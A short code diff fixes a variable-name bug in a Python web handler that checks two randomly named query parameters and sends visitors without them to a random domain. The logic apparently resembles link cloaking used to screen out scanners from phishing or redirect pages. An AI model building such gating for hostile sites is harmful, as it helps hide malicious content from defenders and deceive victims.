@@ -161,7 +161,7 @@ def check_links_and_serve():
     ipv = request.args.get('wE657UyRfVtO')
     iav = request.args.get('VfDbGdT4R4ErD54tR1DtR')
 
-    if not trexxcoz or not coztrexx:
+    if not ipv or not iav:
         # If parameters are missing, redirect to a random domain
         random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
         REDIRECT_URL = 'https://' + 'www.' + random_domain
